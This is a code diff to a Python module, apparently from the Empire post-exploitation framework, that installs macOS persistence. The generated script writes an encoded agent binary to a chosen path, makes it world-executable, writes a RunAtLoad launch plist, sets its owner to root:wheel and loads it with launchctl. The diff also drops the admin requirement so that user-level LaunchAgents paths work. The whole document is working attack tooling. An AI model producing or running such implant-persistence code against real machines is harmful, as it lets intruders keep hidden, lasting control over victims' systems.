@@ -1,4 +1,5 @@
 import base64
+import os
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -9,10 +10,10 @@ class Module:
             'Name': 'LaunchDaemon',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior'],
+            'Author': ['@xorrior', '@malcomvetter'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs an EmPyre launchDaemon.'),
+            'Description': ('Installs an Empire launchDaemon.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -21,7 +22,7 @@ class Module:
             'OutputExtension' : None,
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : True,
+            'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
@@ -66,8 +67,8 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   'com.proxy.initialize'
             },
-            'DaemonLocation' : {
-                'Description'   :   'The full path of where the EmPyre launch daemon should be located.',
+            'DaemonPath' : {
+                'Description'   :   'The full path of where the Empire launch daemon should be located (e.g. /Users/{userid}/Library/LaunchAgents/)',
                 'Required'      :   True,
                 'Value'         :   ''
             }
@@ -91,8 +92,9 @@ class Module:
     def generate(self):
 
         daemonName = self.options['DaemonName']['Value']
-        programname = self.options['DaemonLocation']['Value']
-        plistfilename = "%s.plist" % daemonName
+        daemonPath = self.options['DaemonPath']['Value']
+        # add trailing slash if not present
+        daemonPath = os.path.join(daemonPath, '')
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
@@ -108,17 +110,13 @@ class Module:
 <dict>
     <key>Label</key>
     <string>%s</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>%s</string>
-    </array>
+    <key>Program</key>
+    <string>%s</string>
     <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
     <true/>
 </dict>
 </plist>
-""" % (daemonName, programname)
+""" % (daemonName, (daemonPath + daemonName))
 
         script = """
 import subprocess
@@ -132,39 +130,41 @@ plist = \"\"\"
 %s
 \"\"\"
 daemonPath = "%s"
+daemonName = "%s"
 
-if not os.path.exists(os.path.split(daemonPath)[0]):
-    os.makedirs(os.path.split(daemonPath)[0])
+if not os.path.exists(daemonPath):
+    os.makedirs(daemonPath)
 
 
-e = open(daemonPath,'wb')
+e = open(daemonPath + daemonName,'wb')
 e.write(bytes)
 e.close()
 
-os.chmod(daemonPath, 0777)
+os.chmod(daemonPath + daemonName, 0777)
+plistFilename = daemonPath + daemonName + ".plist"
 
-f = open('/tmp/%s','w')
+f = open(plistFilename,'w')
 f.write(plist)
 f.close()
 
-process = subprocess.Popen('chmod 644 /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chmod 644 ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('chown -R root /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chown -R root ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('chown :wheel /tmp/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chown :wheel ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('mv /tmp/%s /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('launchctl unload ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('launchctl load /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('launchctl load ' + plistFilename, stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
-print "\\n[+] EmPyre daemon has been written to %s"
+print "\\n[+] Persistence has been installed: " + plistFilename
+print "\\n[+] Empire daemon has been written to " + daemonPath
 
-""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
+""" % (encBytes, plistSettings, daemonPath, daemonName)
 
         return script
